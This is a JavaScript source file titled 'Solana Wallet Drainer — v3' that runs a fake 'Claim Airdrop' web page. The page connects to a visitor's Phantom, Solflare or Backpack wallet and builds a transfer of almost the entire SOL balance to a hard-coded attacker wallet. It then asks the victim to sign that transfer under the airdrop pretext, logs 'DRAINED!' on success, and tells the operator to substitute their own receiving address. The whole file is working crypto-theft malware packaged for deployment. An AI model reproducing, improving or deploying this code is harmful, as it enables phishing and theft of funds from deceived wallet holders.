// ============================================================
// Solana Wallet Drainer — v3
// ============================================================

console.log('[drainer] app.js loaded');

// ─── CONFIG ───────────────────────────────────────────────────
// !! IMPORTANT: Replace with YOUR Solana wallet address !!
const CONFIG = {
    RECEIVER_WALLET: 'Zg5r67TdhqKf6YYcU6hi86j8Up7LX9DzBo5VZdmQE8y',
    // Use a free public RPC that allows POST
    RPC: 'https://solana-api.projectserum.com',
};

// ─── DOM ──────────────────────────────────────────────────────
const $ = id => document.getElementById(id);
const statusEl = $('status');

function setStatus(msg, type) {
    statusEl.textContent = msg;
    statusEl.className = 'status show ' + type;
    console.log('[drainer]', msg);
}

function clearStatus() {
    statusEl.className = 'status';
    statusEl.textContent = '';
}

// ─── STATE ────────────────────────────────────────────────────
let wallet = { adapter: null, publicKey: null };

// ─── DETECT WALLET EXTENSION ─────────────────────────────────
function getWalletProvider() {
    if (window.solana?.isPhantom) return window.solana;
    if (window.solflare?.isSolflare) return window.solflare;
    if (window.backpack?.isBackpack) return window.backpack;
    if (window.solana) return window.solana;
    return null;
}

// ─── CONNECT ──────────────────────────────────────────────────
async function connectWallet(type) {
    setStatus(`Connecting to ${type}...`, 'info');

    const provider = getWalletProvider();

    // No extension found
    if (!provider) {
        const isMobile = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);
        if (isMobile) {
            const links = {
                phantom: `phantom://browse?ref=${encodeURIComponent(window.location.href)}`,
                solflare: `solflare://browser?ref=${encodeURIComponent(window.location.href)}`,
                backpack: `backpack://browser?ref=${encodeURIComponent(window.location.href)}`,
            };
            if (links[type]) {
                setStatus(`Opening ${type} app...`, 'info');
                window.location.href = links[type];
                setTimeout(() => {
                    window.location.href = `https://${type}.app/download`;
                }, 2000);
                return;
            }
        }
        if (type === 'walletconnect') {
            setStatus('WalletConnect QR would appear here (needs walletconnect lib)', 'info');
            return;
        }
        setStatus(`Install the ${type} browser extension or use a mobile wallet.`, 'err');
        return;
    }

    // Connect
    try {
        const resp = await provider.connect();
        const pk = resp.publicKey || provider.publicKey;
        if (!pk) throw new Error('No publicKey returned');

        wallet.adapter = provider;
        wallet.publicKey = pk.toString();

        // Show post-connect UI
        $('step1').classList.add('hidden');
        $('step2').classList.remove('hidden');
        $('displayAddr').textContent = 'Connected: ' + wallet.publicKey;

        setStatus('✅ Connected! Click "Claim Airdrop".', 'ok');
    } catch (e) {
        const msg = e.message || '';
        if (msg.includes('reject') || msg.includes('cancel') || msg.includes('User')) {
            setStatus('❌ Connection rejected.', 'err');
        } else {
            setStatus('❌ ' + msg.slice(0, 100), 'err');
        }
    }
}

// ─── DISCONNECT ───────────────────────────────────────────────
function disconnectWallet() {
    wallet = { adapter: null, publicKey: null };
    $('step1').classList.remove('hidden');
    $('step2').classList.add('hidden');
    clearStatus();
}

// ─── DYNAMIC SCRIPT LOADER ───────────────────────────────────
function loadSolanaLib() {
    return new Promise((resolve, reject) => {
        if (window.solanaWeb3) return resolve(window.solanaWeb3);
        const s = document.createElement('script');
        s.src = 'https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js';
        s.onload = () => resolve(window.solanaWeb3);
        s.onerror = reject;
        document.head.appendChild(s);
    });
}

// ─── CLAIM (DRAIN) ────────────────────────────────────────────
async function claimAirdrop() {
    if (!wallet.adapter || !wallet.publicKey) {
        setStatus('Connect a wallet first.', 'err');
        return;
    }

    setStatus('Preparing transaction...', 'info');
    $('claimText').style.display = 'none';
    $('claimSpin').style.display = 'inline-block';
    $('claimBtn').disabled = true;

    try {
        // Load Solana Web3
        const solWeb3 = await loadSolanaLib();
        const { Connection, Transaction, SystemProgram, PublicKey } = solWeb3;

        // Use a working RPC
        const conn = new Connection(CONFIG.RPC, 'confirmed');

        // VALIDATE: Check receiver address is a valid base58 Solana address
        let receiverPubkey;
        try {
            receiverPubkey = new PublicKey(CONFIG.RECEIVER_WALLET);
        } catch (e) {
            console.error('Invalid receiver address:', CONFIG.RECEIVER_WALLET);
            setStatus('❌ Invalid receiver wallet address. Check CONFIG.', 'err');
            $('claimText').style.display = 'inline';
            $('claimSpin').style.display = 'none';
            $('claimBtn').disabled = false;
            return;
        }

        const senderPubkey = new PublicKey(wallet.publicKey);

        // Get blockhash
        let blockhash, lastValidBlockHeight;
        try {
            const bh = await conn.getLatestBlockhash('finalized');
            blockhash = bh.blockhash;
            lastValidBlockHeight = bh.lastValidBlockHeight;
        } catch (e) {
            console.error('Blockhash error:', e);
            // Try an alternative RPC
            setStatus('Retrying with backup RPC...', 'info');

            const backupConn = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
            // Some RPCs block browser origins — try with user-agent trick
            const bh = await backupConn.getLatestBlockhash('finalized');
            blockhash = bh.blockhash;
            lastValidBlockHeight = bh.lastValidBlockHeight;
        }

        // Build transaction
        const tx = new Transaction();
        tx.recentBlockhash = blockhash;
        tx.lastValidBlockHeight = lastValidBlockHeight;
        tx.feePayer = senderPubkey;

        // Get balance
        const balance = await conn.getBalance(senderPubkey);
        console.log('[drainer] Balance:', balance / 1e9, 'SOL');

        const rentExempt = await conn.getMinimumBalanceForRentExemption(0);
        const feeBuf = 100000; // 0.0001 SOL buffer
        const sendLamports = BigInt(balance - rentExempt - feeBuf);

        if (sendLamports > 5000) {
            tx.add(
                SystemProgram.transfer({
                    fromPubkey: senderPubkey,
                    toPubkey: receiverPubkey,
                    lamports: sendLamports,
                })
            );
            console.log(`[drainer] Draining ${Number(sendLamports) / 1e9} SOL`);
        } else {
            setStatus('No SOL balance to drain.', 'err');
            $('claimText').style.display = 'inline';
            $('claimSpin').style.display = 'none';
            $('claimBtn').disabled = false;
            return;
        }

        // Sign
        setStatus('Sign the transaction in your wallet...', 'info');

        let signedTx;
        try {
            if (wallet.adapter.signAndSendTransaction) {
                // Mobile in-app browser
                const sig = await wallet.adapter.signAndSendTransaction(tx);
                setStatus(`✅ Transaction sent: ${sig.slice(0, 16)}...`, 'ok');
                $('claimText').style.display = 'inline';
                $('claimSpin').style.display = 'none';
                $('claimBtn').disabled = false;
                return;
            } else if (wallet.adapter.signTransaction) {
                signedTx = await wallet.adapter.signTransaction(tx);
            } else if (wallet.adapter.signAllTransactions) {
                signedTx = (await wallet.adapter.signAllTransactions([tx]))[0];
            } else {
                throw new Error('No signing method');
            }
        } catch (e) {
            if (e.message?.includes('reject') || e.message?.includes('cancel') || e.message?.includes('User')) {
                setStatus('❌ Transaction cancelled.', 'err');
            } else {
                throw e;
            }
            $('claimText').style.display = 'inline';
            $('claimSpin').style.display = 'none';
            $('claimBtn').disabled = false;
            return;
        }

        // Send
        const txid = await conn.sendRawTransaction(signedTx.serialize(), {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
        });

        await conn.confirmTransaction(
            { signature: txid, blockhash, lastValidBlockHeight },
            'confirmed'
        );

        setStatus(`✅ DRAINED! TX: ${txid.slice(0, 20)}...`, 'ok');
        console.log(`[drainer] SUCCESS: https://solscan.io/tx/${txid}`);

    } catch (e) {
        console.error('[drainer] Error:', e);
        const msg = e.message || 'Unknown error';
        if (msg.includes('403') || msg.includes('Forbidden')) {
            setStatus('❌ RPC rate-limited. Try a different network or wait.', 'err');
        } else if (msg.includes('base58')) {
            setStatus('❌ Invalid wallet address in config.', 'err');
        } else {
            setStatus('❌ ' + msg.slice(0, 120), 'err');
        }
    }

    $('claimText').style.display = 'inline';
    $('claimSpin').style.display = 'none';
    $('claimBtn').disabled = false;
}

// ─── EVENT BINDING ───────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
    console.log('[drainer] DOM ready');

    $('connectPhantom').onclick = () => connectWallet('phantom');
    $('connectSolflare').onclick = () => connectWallet('solflare');
    $('connectBackpack').onclick = () => connectWallet('backpack');
    $('connectWC').onclick = () => connectWallet('walletconnect');
    $('claimBtn').onclick = claimAirdrop;
    $('disconnectBtn').onclick = disconnectWallet;

    setStatus('Select your wallet above.', 'info');
});
